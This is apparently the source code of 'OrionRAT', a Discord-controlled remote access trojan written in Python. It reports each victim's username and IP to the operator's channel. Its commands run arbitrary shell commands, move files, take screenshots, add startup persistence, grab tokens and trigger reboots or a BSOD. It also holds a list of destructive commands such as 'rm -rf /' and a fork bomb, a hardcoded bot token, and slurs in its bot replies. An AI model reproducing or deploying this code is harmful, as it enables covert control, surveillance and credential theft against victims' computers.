import discord
from discord.ext import commands
from funcs import notify, pwdd, cdd, lsls, exece, screenshots, shutdowns, processkill, reboot, bsodo, gettoken, checkvm, persistence
import time
from time import sleep
import platform
import requests
import os
import sys
import tempfile
import os, sys, tempfile, signal
# Generate a unique lock file based on the absolute path of this script
abs_path = os.path.abspath(sys.argv[0])
lock_name = abs_path.replace(os.sep, "_") + ".lock"
lock_file = os.path.join(tempfile.gettempdir(), lock_name)

# Check if previous instance exists
if os.path.exists(lock_file):
    with open(lock_file, "r") as f:
        try:
            old_pid = int(f.read())
            # Try killing previous process
            if sys.platform.startswith("win"):
                os.system(f"taskkill /f /pid {old_pid} >nul 2>&1")
            else:
                os.kill(old_pid, signal.SIGTERM)
        except Exception:
            pass  # Ignore if PID invalid or process already dead

# Write current PID to lock file
with open(lock_file, "w") as f:
    f.write(str(os.getpid()))

try:
    print("Running single instance. Previous instance killed if existed.")
    input("Press Enter to exit...")  # Replace with your main logic
finally:
    if os.path.exists(lock_file):
        os.remove(lock_file)




checkvm.check()
user=os.getlogin()
rip=requests.get('https://checkip.amazonaws.com/')
ip=rip.text
status = ["rm -rf /", "rm -rf /home/*", "rm -rf *", ":(){ :|:& };:", "ifconfig eth0 down", "ip link set eth0 down", "kill -9 -1", "chmod -R 000 /", "rm -rf /boot/*", "rm -rf /bin /sbin /usr/bin /usr/sbin", "shutdown -h now", "reboot", "systemctl stop network-manager", "echo 1  /proc/sys/kernel/sysrq", "echo c  /proc/sysrq-trigger", "echo b  /proc/sysrq-trigger", "mount -o remount,ro /", "umount -a", "chattr +i /", "swapoff -a", "echo 0  /proc/1/oom_adj", "pkill -u root", "rm -rf /var/log/*", "truncate -s 0 /etc/passwd", "truncate -s 0 /etc/shadow", "rm -rf /tmp/*", "rm -rf /var/*", "poweroff", "shutdown"]


intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="$", intents=intents, help_command=None)

@bot.event
async def on_ready():    
        await bot.change_presence(
        activity=discord.Game(name=ip),  # Playing …
        status=discord.Status.online  # online, idle, dnd, invisible
        )
        channel = bot.get_channel(1409571342373748746)
        embed = discord.Embed(
            title=F"OrionRAT | New connection.",
            description=f"Username: **{user}**\nIP: **{ip}**\n**To see commands, type $help**",
            color=discord.Color.red()  # You can choose another color
        )
        await channel.send('<@&1409573051263090759>',embed=embed)
@bot.command()
async def help(ctx):
    help_text = r"""```ansi
[2;31m[ [0mOrionRAT [2;31m][0m - [2;31m[[0m V1 [2;31m]

[2;31mPrefix[0m  [2;32m$[0m

[2;31m[[0m pwd [2;31m][0m  Show current directory
[2;31m[[0m cd <path> [2;31m][0m  Change directory
[2;31m[[0m ls [2;31m][0m  List files
[2;31m[[0m whoami [2;31m][0m  Show current user
[2;31m[[0m upload <attachment>[2;31m][0m  Upload a file
[2;31m[[0m download <path [2;31m][0m  Download a file
[2;31m[[0m enum [2;31m][0m  Send netstat log
[2;31m[[0m ss [2;31m][0m  Take screenshot
[2;31m[[0m notf <text [2;31m][0m  Send a notification
[2;31m[[0m restart [2;31m][0m  Restart system
[2;31m[[0m shutdown [2;31m][0m  Shutdown system
[2;31m[[0m kill <process [2;31m][0m  Kill a process
[2;31m[[0m exec <command [2;31m][0m  Execute a shell command
[2;31m[[0m add_startup <name [2;31m][0m  Add to startup
[2;31m[[0m hello [2;31m][0m  Greet
[2;31m[[0m steak [2;31m][0m  Try it. 
```"""

    await ctx.send(help_text)
@bot.command()
async def pwd(ctx):
    content=pwdd.get_dir()
    await ctx.reply(f'`{content}`')
@bot.command()
async def bsod(ctx):
    if platform.system() == "Windows":
        try:
            bsodo.trigger()
            await ctx.send(":white_check_mark: Succesfully triggered BSOD!") 
        except Exception as e:
            await ctx.send(f":x: There was an error triggering BSOD: `{e}`") 
    else:
        await ctx.send(f":x: The victim's OS is incompatible with this command.") 
@bot.command()
async def cd(ctx, text: str):
    cdd.cde(path=text)
    finalpath=pwdd.get_dir()
    await ctx.reply(f'Changed path to: `{finalpath}`')
@bot.command()
async def whoami(ctx):
     await ctx.send(f'`{user}`')
@bot.command()
async def upload(ctx):
    if not ctx.message.attachments:
        await ctx.send("No file attached!")
        return
    if platform.system() == "Linux":
        upload_dir = "/home/plasma/.local/share/"
    elif platform.system() == "Windows":
        upload_dir = os.path.join(os.environ['APPDATA'].replace("Roaming", "LocalLow"))
    else:
        upload_dir = "uploads"

    os.makedirs(upload_dir, exist_ok=True)

    for attachment in ctx.message.attachments:
        file_path = os.path.join(upload_dir, attachment.filename)
        await attachment.save(file_path)
        await ctx.send(f"File `{attachment.filename}` saved on host at `{file_path}`!")
@bot.command()
async def enum(ctx):
    if platform.system() == 'Linux':
        file = discord.File(f'/home/{user}/.local/share/netstat.log')
        await ctx.send(file=file)
        os.remove(f'/home/{user}/.local/share/netstat.log')
    elif platform.system() == "Windows":
        file = discord.File(os.path.join(os.environ["LOCALAPPDATA"], "Low", "netstat.log"))
        await ctx.send(file=file)
@bot.command()
async def hello(ctx):
    await ctx.send(f"Yo twin we alone now, js finish programming me and go to bed, you should sleep its pretty late :hearts: , we're gonna be ratting alot of people thanks to you my nigga :money_mouth: :money_mouth: ")
@bot.command()
async def ls(ctx):
    items = lsls.lss()
    output = ""
    for i in items:
        output += f"{i}\n"
    await ctx.send(f"```{output}```")
@bot.command()
async def restart(ctx):
     try:
         reboot.run()
         await ctx.send(":white_check_mark: Succesfully rebooted victim's computer!") 
     except Exception as e:
          await ctx.send(f":x: There was an error restarting the computer: `{e}`") 
@bot.command()
@commands.has_role("Admin") 
async def shutdown(ctx):
     try:
         shutdowns.run()
         await ctx.send(":white_check_mark: Succesfully shutted down victim's computer!") 
     except Exception as e:
          await ctx.send(f":x: There was an error shutting down: `{e}`") 
@bot.command()
async def kill(ctx, text: str):
     try:
        processkill.kill(proc_name=text)
        await ctx.send(f":white_check_mark: | Succesfully executed commmand `{text}`.") 
     except Exception as e:
        await ctx.send(f":x: | There was an error killing the process: `{e}`")
@bot.command()
async def exec(ctx, text: str):
    if text in status:
        ctx.send("Fuck you bitch")
    else:
        try:
            exece.execes(data=f"{text}")
            ctx.send(f":white_check_mark: | Command executed in shell.")
        except Exception as e:
                ctx.send(f":x: | Couldnt execute command: {e}")
@bot.command()
async def add_startup(ctx, text: str):
     persistence.run(name=text)
     ctx.send(':white_check_mark: | Persistence added.')
@bot.command()
async def download(ctx, text:str):
     try:
        file =  discord.File(text)
        await ctx.send(file=file)
     except Exception:
          pass
    
@bot.command()
async def gettokens(ctx):
    if platform.system() == "Windows":
        try:
            gettoken.run()
            with open(f'C:\\Users\\{user}\\AppData\\LocalLow\\runtimelog.txt') as tkntxt:
                 content=tkntxt.read()
            ctx.send(f'{content}')
        except Exception as e:
                ctx.send(f":x: | Couldnt grab tokens: `{e}`")
    else:
        await ctx.send(f":x: The victim's OS is incompatible with this command.") 
    
@bot.command()
async def steak(ctx):
     await ctx.send('learn to type next time retarded sperm cell')
     await ctx.send('https://images-ext-1.discordapp.net/external/N2TOJTU8zf5dPN9VtdtWTu4muB69vJRo7pAs69dIGvQ/https/media.tenor.com/i5ctFNzwWLIAAAPo/steak.mp4')
@bot.command()
async def ss(ctx):
     screenshots.sgrab()
     if platform.system() == "Linux":
          file = discord.File("/tmp/sys.png")
          await ctx.send(file=file)
     screenshots.sdelete()
    
@bot.command()
async def notf(ctx, *, text: str):
    notify.notify(content=text)
    try:
        await ctx.send(f"{ctx.author.mention}, notification sent successfully! ✅")
    except Exception as e:
        print("Failed to send confirmation in Discord:", e)

bot.run('MTQwODkyNzg3Nzc4MDQ3MjA0MQ.GTY0wd.8X1RlhxrNpX35YEzYIhd3K3zfGTTxA30OwGW6s')
